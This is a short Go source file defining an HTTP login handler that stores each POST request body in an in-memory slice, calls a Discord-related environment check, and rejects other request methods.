package handlers

import (
	"fmt"
	"io/ioutil"
	"net/http"

	"../discordApi"
)

var results []string

func LoginHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method == "POST" {
		body, err := ioutil.ReadAll(r.Body)
		if err != nil {
			http.Error(w, "Error reading request body",
				http.StatusInternalServerError)
		}
		results = append(results, string(body))
		discordApi.CheckEnvs()
		fmt.Fprint(w, "POST done")
	} else {
		http.Error(w, "Invalid request method", http.StatusMethodNotAllowed)
	}
}
